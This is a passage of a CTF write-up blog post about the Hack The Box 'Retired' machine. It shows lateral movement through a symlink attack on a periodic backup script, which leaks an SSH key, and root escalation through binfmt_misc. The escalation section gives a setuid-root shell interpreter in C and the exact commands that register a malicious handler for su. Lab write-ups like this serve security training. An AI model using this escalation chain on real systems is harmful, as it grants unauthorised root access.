<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">52</span><span class="n">K</span> <span class="n">Feb</span>  <span class="mi">7</span>  <span class="mi">2020</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">chsh</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">179</span><span class="n">K</span> <span class="n">Feb</span> <span class="mi">27</span>  <span class="mi">2021</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sudo</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">55</span><span class="n">K</span> <span class="n">Jan</span> <span class="mi">20</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">mount</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">35</span><span class="n">K</span> <span class="n">Jan</span> <span class="mi">20</span>  <span class="mi">2022</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">umount</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">--</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">messagebus</span> <span class="mi">51</span><span class="n">K</span> <span class="n">Feb</span> <span class="mi">21</span>  <span class="mi">2021</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="mf">1.0</span><span class="o">/</span><span class="n">dbus</span><span class="o">-</span><span class="n">daemon</span><span class="o">-</span><span class="n">launch</span><span class="o">-</span><span class="n">helper</span>
<span class="o">-</span><span class="n">rwsr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">root</span> <span class="mi">471</span><span class="n">K</span> <span class="n">Mar</span> <span class="mi">13</span>  <span class="mi">2021</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">openssh</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">keysign</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Also, checking the system with <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a> gives little more information. From the previous stage, we know that there is a <code class="language-plaintext highlighter-rouge">dev</code> user. Let’s check his home directory. Unfortunately, we don’t have enough permissions to check what’s inside. The shell is spawned in <code class="language-plaintext highlighter-rouge">/var/www</code> directory for user <code class="language-plaintext highlighter-rouge">www-data</code>. After looking around, we can notice three ZIP files. They contain a backup of the <code class="language-plaintext highlighter-rouge">/var/www/html</code> directory, and they’re done periodically every minute. We can exploit this behaviour in the next stage.</p>
<h2 id="lateral-movement">
<span class="mr-2">Lateral movement</span><a href="#lateral-movement" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
</h2>
<p>We’ve learned about users on the host from the previous stages, so the short escalation path will look like this: www-data → dev → root.</p>
<p>We can make a symlink attack - symlink <code class="language-plaintext highlighter-rouge">/home/dev</code> folder inside <code class="language-plaintext highlighter-rouge">/var/www/html</code>, so it will be archived by the backup script. After a few minutes (and a few tries), we’ve got <code class="language-plaintext highlighter-rouge">/home/dev</code> archived (the ZIP file size is different than other files). When we unpack it, we can get SSH private key for the <code class="language-plaintext highlighter-rouge">dev</code> user in <code class="language-plaintext highlighter-rouge">var/www/html/dev/.ssh</code> folder:</p>
<p><a href="/assets/img/htb/retired/id_rsa.png" class="popup img-link "><img data-src="/assets/img/htb/retired/id_rsa.png" alt="Private SSH key" class="lazyload" data-proofer-ignore></a></p>
<p>After login in as a <code class="language-plaintext highlighter-rouge">dev</code> user, we see a user flag and a few folders created: <code class="language-plaintext highlighter-rouge">activate_license</code> and <code class="language-plaintext highlighter-rouge">emuemu</code>.</p>
<p><a href="/assets/img/htb/retired/dev.png" class="popup img-link "><img data-src="/assets/img/htb/retired/dev.png" alt="Dev user home directory" class="lazyload" data-proofer-ignore></a></p>
<p>The first one contains sources of the activate_license program, and in the second one, there are two source files: <code class="language-plaintext highlighter-rouge">emuemu.c</code> and <code class="language-plaintext highlighter-rouge">reg_helper.c</code>. Emuemu.c is just a stub, but reg_helper.c is more interesting, as it contains a code which writes to <code class="language-plaintext highlighter-rouge">/proc/sys/fs/binfmt_misc/register</code>. According to <code class="language-plaintext highlighter-rouge">Makefile</code> reg_helper file is copied into <code class="language-plaintext highlighter-rouge">/usr/lib/emuemu/</code> folder. Also, it has capabilities: <code class="language-plaintext highlighter-rouge">cap_dac_override=ep</code> set, which bypasses file read, write, and execute permission checks.</p>
<p><a href="/assets/img/htb/retired/makefile.png" class="popup img-link "><img data-src="/assets/img/htb/retired/makefile.png" alt="Contents of Makefile" class="lazyload" data-proofer-ignore></a></p>
<p>Let’s verify if it’s installed.</p>
<div class="language-python highlighter-rouge">
<div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td>
<td class="rouge-code"><pre><span class="n">dev</span><span class="nd">@retired</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span><span class="n">usr</span> <span class="o">-</span><span class="nb">type</span> <span class="n">f</span> <span class="o">-</span><span class="n">name</span> <span class="n">reg_helper</span> <span class="o">-</span><span class="k">exec</span> <span class="n">ls</span> <span class="o">-</span><span class="n">alh</span> <span class="p">{}</span> \<span class="p">;</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
<span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">x</span><span class="o">---</span> <span class="mi">1</span> <span class="n">root</span> <span class="n">dev</span> <span class="mi">17</span><span class="n">K</span> <span class="n">Oct</span> <span class="mi">13</span>  <span class="mi">2021</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">emuemu</span><span class="o">/</span><span class="n">reg_helper</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<h2 id="privilege-escalation">
<span class="mr-2">Privilege escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a>
</h2>
<p>There is an excellent post about binfmt_misc exploitation: <a href="https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/">https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/</a>, and we can use information from there to exploit binfmt_misc on this box. We reuse a simple interpreter from that article:</p>
<div class="language-c highlighter-rouge">
<div class="code-header"> <span data-label-text="C"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre></td>
<td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">envp</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span> <span class="n">my_args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"/bin/bash"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="n">execve</span><span class="p">(</span><span class="n">my_args</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">my_args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="p">}</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>Now, we can create a hex pattern for the binfmt_misc register with dd and Perl. I’ve picked a <code class="language-plaintext highlighter-rouge">su</code> program, but you can choose any other with the SUID attribute set.</p>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
</pre></td>
<td class="rouge-code"><pre><span class="nb">dd </span><span class="k">if</span><span class="o">=</span>/bin/su <span class="nv">bs</span><span class="o">=</span>1 <span class="nv">count</span><span class="o">=</span>121 <span class="nv">status</span><span class="o">=</span>none | perl <span class="nt">-pe</span> <span class="s1">'s/(.)/sprintf("\\x%02x", ord($1))/eg'</span>
</pre></td>
</tr></tbody></table></code></div>
</div>
<div class="language-bash highlighter-rouge">
<div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button>
</div>
<div class="highlight"><code><table class="rouge-table"><tbody><tr>
<td class="rouge-gutter gl"><pre class="lineno">1
</pre></td>
<td class="rouge-code"><pre><span class="nb">echo</span> <span class="s1">':x:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x38\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\xa8\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x0b\x00\x40\x00\x1d\x00\x1c\x00\x06\x00\x00\x00\x04\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x03::/home/dev/i:OC'</span> | /usr/lib/emuemu/reg_helper
</pre></td>
</tr></tbody></table></code></div>
</div>
<p>After sending the pattern with parameters to the reg_helper program, we can escalate our privileges to the root user by running our chosen SUID program:</p>
<p><a href="/assets/img/htb/retired/root.png" class="popup img-link "><img data-src="/assets/img/htb/retired/root.png" alt="Getting root" class="lazyload" data-proofer-ignore></a></p>
</div>
<div class="post-tail-wrapper text-muted">
<div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href="/categories/writeup/">Writeup</a>, <a href="/categories/htb/">HTB</a>
</div>
<div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration">htb</a> <a href="/tags/retired/" class="post-tag no-text-decoration">retired</a> <a href="/tags/writeup/" class="post-tag no-text-decoration">writeup</a> <a href="/tags/pwntools/" class="post-tag no-text-decoration">pwntools</a> <a href="/tags/rop/" class="post-tag no-text-decoration">rop</a> <a href="/tags/lfi/" class="post-tag no-text-decoration">lfi</a>
</div>
<div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
<div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div>
<div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB/Retired%20-%20writeup%20-%20Farrim's%20blog&amp;url=https%3A%2F%2Ffarrim.re%2Fposts%2Fhtb-retired%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span>
</div>
</div>
</div>
</div></div>
<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">
<div class="access">
<div id="access-lastmod" class="post">
<div class="panel-heading">Recently Updated</div>
<ul class="post-content pl-0 pb-1 ml-1 mt-2">
<li><a href="/posts/thm-pwn101/">THM/pwn101 - writeup, part 1</a></li>
<li><a href="/posts/htb-retired/">HTB/Retired - writeup</a></li>
<li><a href="/posts/rop-emporium-ret2win/">ROP Emporium - ret2win (x64) - writeup</a></li>
<li><a href="/posts/testing-testing/">Testing testing...</a></li>
<li><a href="/posts/htb-blue-writeup/">HTB Blue - writeup</a></li>
</ul>
</div>
<div id="access-tags">
<div class="panel-heading">Trending Tags</div>
<div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/rop/">rop</a> <a class="post-tag" href="/tags/emporium/">emporium</a> <a class="post-tag" href="/tags/x64/">x64</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/blue/">blue</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/callme/">callme</a> <a class="post-tag" href="/tags/eternal-blue/">eternal_blue</a>
</div>
</div>
</div>
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5">
<div class="panel-heading pl-3 pt-2 mb-2">Contents</div>
<nav id="toc" data-toggle="toc"></nav>
</div>
</div>
</div>
<div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5">
<div id="related-posts" class="mb-2 mb-sm-4">
<h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3>
<div class="card-deck mb-4">
<div class="card"> <a href="/posts/rop-emporium-ret2win/"><div class="card-body"> <em class="small" data-ts="1678392121" data-df="ll"> Mar 9, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - ret2win (x64) - writeup</h3>
<div class="text-muted small"><p> ret2win is the first challenge in ROP Emporium series where you need to create very simple ROP to call specific function in binary to get the flag. As mentioned on challenge page we need to feed a...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/rop-emporium-split/"><div class="card-body"> <em class="small" data-ts="1678741651" data-df="ll"> Mar 13, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - split (x64) - writeup</h3>
<div class="text-muted small"><p> Split is a second challenge from ROP Emporium where your goal is to find elements scattered all over the binary and use them to get the flag. So, let’s start our hunting! First of all, checksec: ...</p></div>
</div></a>
</div>
<div class="card"> <a href="/posts/rop-emporium-callme/"><div class="card-body"> <em class="small" data-ts="1678836423" data-df="ll"> Mar 14, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ROP Emporium - callme (x64) - writeup</h3>
<div class="text-muted small"><p> In this task we need to call three functions: callme_one, callme_two and callme_three in exact order, also with proper function arguments. As mentioned on the challenge page, x86_64 binary uses dou...</p></div>
</div></a>
</div>
</div>
</div>
<div class="post-navigation d-flex justify-content-between"> <a href="/posts/rop-emporium-callme/" class="btn btn-outline-primary" prompt="Older"><p>ROP Emporium - callme (x64) - writeup</p></a> <a href="/posts/thm-pwn101/" class="btn btn-outline-primary" prompt="Newer"><p>THM/pwn101 - writeup, part 1</p></a>
</div>
</div></div>
</div>
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content">
<div id="search-hints"><div id="access-tags">
<div class="panel-heading">Trending Tags</div>
<div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/pwntools/">pwntools</a> <a class="post-tag" href="/tags/rop/">rop</a> <a class="post-tag" href="/tags/emporium/">emporium</a> <a class="post-tag" href="/tags/x64/">x64</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/blue/">blue</a> <a class="post-tag" href="/tags/buffer-overflow/">buffer overflow</a> <a class="post-tag" href="/tags/callme/">callme</a> <a class="post-tag" href="/tags/eternal-blue/">eternal_blue</a>
</div>
</div></div>
<div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
</div></div>
</div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3">
<div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/farrimwildaxe">Farrim Wildaxe</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div>
<div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div>
</div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/unregister.js"></script>
